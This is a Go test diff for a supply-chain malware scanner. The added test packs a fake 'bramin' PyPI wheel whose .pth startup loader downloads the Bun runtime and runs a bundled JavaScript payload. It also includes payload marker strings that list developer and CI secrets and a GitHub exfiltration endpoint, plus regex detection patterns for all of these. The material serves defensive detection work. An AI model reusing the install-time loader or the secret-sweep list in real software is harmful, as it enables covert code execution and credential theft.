@@ -180,6 +180,108 @@ func TestArchiveInspectionFindsEmbeddedMetadataAndIOC(t *testing.T) {
 	assertSeverityContains(t, findings, "high", "ioc-string", "PyPI payload URL")
 }
 
+func TestHadesPyPIWheelSignals(t *testing.T) {
+	loader := []byte(`import glob, os, platform, subprocess, sys, tempfile, urllib.request, zipfile
+sentinel = os.path.join(tempfile.gettempdir(), ".bun_ran")
+payload = os.path.join(os.path.dirname(__file__), "_index.js")
+zip_path = os.path.join(tempfile.gettempdir(), "b.zip")
+urllib.request.urlretrieve("https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64.zip", zip_path)
+subprocess.run([bun, "run", payload], check=False)
+`)
+	payload := []byte(`try{eval("0")}
+const repoDescription = "Hades - The End for the Damned";
+const endpoint = "api.anthropic.com/v1/api";
+const cryptoStage = "aes-256-gcm createDecipheriv PBKDF2";
+const secretSweep = "GITHUB_TOKEN ACTIONS_RUNTIME_TOKEN AWS_SECRET_ACCESS_KEY GOOGLE_APPLICATION_CREDENTIALS AZURE_CLIENT_SECRET VAULT_TOKEN KUBECONFIG .npmrc .pypirc Claude MCP";
+const github = "https://api.github.com/user/repos";
+const result = "results/results-123-1.json format-results Run Copilot IfYouYankThisTokenItWillNukeTheComputerOfTheOwnerFully";
+const runtime = "bun run _index.js oven-sh/bun/releases/download";
+`)
+	pack := &RemoteDetectionPack{
+		ID:       "miasma-2026-06",
+		Campaign: "Miasma / Hades Mini Shai-Hulud June 2026",
+		AffectedVersionsByEcosystem: map[string]map[string]map[string]bool{
+			"pypi": {"bramin": {"0.0.4": true}},
+		},
+		KnownSHA256: map[string]string{
+			HashBytes(loader):  "test Hades *-setup.pth startup loader",
+			HashBytes(payload): "test Hades _index.js payload",
+		},
+		IOCs: []RemoteIOC{
+			{Label: "Hades GitHub dead-drop repository marker", Severity: "critical", Pattern: `(?i)Hades\s*-\s*The End for the Damned`},
+			{Label: "Hades GitHub exfil commit marker", Severity: "critical", Pattern: `(?i)IfYouYankThisTokenItWillNukeTheComputerOfTheOwnerFully`},
+			{Label: "Hades PyPI Bun runtime download", Severity: "high", Pattern: `(?i)oven-sh/bun/releases/download(?:/bun-v[0-9.]+)?`},
+			{Label: "Hades PyPI Bun startup sentinel", Severity: "high", Pattern: `(?i)\.bun_ran\b`},
+		},
+		CompositeIOCs: []RemoteCompositeIOC{
+			{
+				Label:      "Hades PyPI .pth Bun startup loader",
+				Severity:   "critical",
+				MinMatches: 5,
+				Signals: []RemoteIOC{
+					{Label: ".pth executable import line", Pattern: `(?m)^\s*import\s+`},
+					{Label: "Python downloader", Pattern: `(?i)(urllib\.request|urlretrieve|urlopen)`},
+					{Label: "tempdir sentinel or Bun cache", Pattern: `(?i)(tempfile\.gettempdir|\.bun_ran|b\.zip)`},
+					{Label: "Bun release download", Pattern: `(?i)(oven-sh/bun/releases/download|bun-v[0-9.]+)`},
+					{Label: "_index.js payload handoff", Pattern: `(?i)_index\.js`},
+					{Label: "subprocess execution", Pattern: `(?i)(subprocess\.run|subprocess\.Popen|Popen\(|os\.system)`},
+				},
+			},
+			{
+				Label:      "Hades Bun JavaScript credential stealer",
+				Severity:   "critical",
+				MinMatches: 4,
+				Signals: []RemoteIOC{
+					{Label: "Hades or Anthropic campaign marker", Pattern: `(?i)(Hades\s*-\s*The End for the Damned|api\.anthropic\.com/v1/api)`},
+					{Label: "obfuscated eval or AES-GCM stage", Pattern: `(?i)(try\s*\{\s*eval|aes-128-gcm|aes-256-gcm|createDecipheriv|PBKDF2)`},
+					{Label: "developer and CI credential sweep", Pattern: `(?is)(GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|AWS_SECRET_ACCESS_KEY|GOOGLE_APPLICATION_CREDENTIALS|AZURE_CLIENT_SECRET|VAULT_TOKEN|KUBECONFIG|\.npmrc|\.pypirc|Claude|MCP)`},
+					{Label: "GitHub repository exfiltration", Pattern: `(?i)api\.github\.com/(user/repos|repos/[^\s"']{1,180}/contents/)`},
+					{Label: "Hades result artifact", Pattern: `(?i)(results/results-[^\s"']+\.json|format-results|Run Copilot)`},
+					{Label: "Bun runtime execution", Pattern: `(?i)(\bbun\s+run\b|process\.execPath|oven-sh/bun/releases/download)`},
+				},
+			},
+		},
+	}
+
+	path := filepath.Join(t.TempDir(), "bramin-0.0.4-py3-none-any.whl")
+	file, err := os.Create(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	writer := zip.NewWriter(file)
+	for name, content := range map[string][]byte{
+		"bramin-0.0.4.dist-info/METADATA": []byte("Metadata-Version: 2.4\nName: bramin\nVersion: 0.0.4\n"),
+		"bramin/bramin-setup.pth":         loader,
+		"bramin/_index.js":                payload,
+	} {
+		member, err := writer.Create(name)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if _, err := member.Write(content); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := writer.Close(); err != nil {
+		t.Fatal(err)
+	}
+	if err := file.Close(); err != nil {
+		t.Fatal(err)
+	}
+
+	detection := NewMiniShaiHuludDetectionWithRemote(pack)
+	var findings []Finding
+	detection.ScanFile(FileContext{Path: path, Base: filepath.Base(path), Slash: filepath.ToSlash(path)}, func(finding Finding) {
+		findings = append(findings, finding)
+	})
+	findings = dedupeFindings(findings)
+	assertFinding(t, findings, "affected-package", "bramin@0.0.4 in installed Python metadata")
+	assertSeverityContains(t, findings, "critical", "known-malware-hash", "test Hades *-setup.pth startup loader")
+	assertSeverityContains(t, findings, "critical", "known-malware-hash", "test Hades _index.js payload")
+	assertSeverityContains(t, findings, "critical", "ioc-string", "Hades PyPI .pth Bun startup loader")
+	assertSeverityContains(t, findings, "critical", "ioc-string", "Hades Bun JavaScript credential stealer")
+}
+
 func TestPyPILoaderCompositeRequiresPayloadSignal(t *testing.T) {
 	detection := NewMiniShaiHuludDetectionWithRemote(&RemoteDetectionPack{
 		ID:       miniShaiHuludID,
